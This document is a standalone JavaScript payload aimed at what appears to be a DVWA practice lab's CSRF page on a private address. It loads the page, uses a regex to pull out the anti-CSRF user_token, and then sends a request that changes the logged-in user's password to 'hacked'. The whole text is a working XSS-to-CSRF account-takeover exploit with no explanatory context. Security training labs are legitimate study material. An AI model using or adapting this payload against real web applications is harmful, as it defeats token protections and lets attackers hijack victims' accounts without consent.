<script>
var req = new XMLHttpRequest();
req.open("GET", "http://192.168.37.132:4280/vulnerabilities/csrf/", false);
req.send();
var html = req.responseText;
var match = html.match(/user_token[^>]+value='([^']+)'/);
var token = match[1];

var req2 = new XMLHttpRequest();
req2.open("GET", "http://192.168.37.132:4280/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change&user_token="+token, false);
req2.send();
</script>
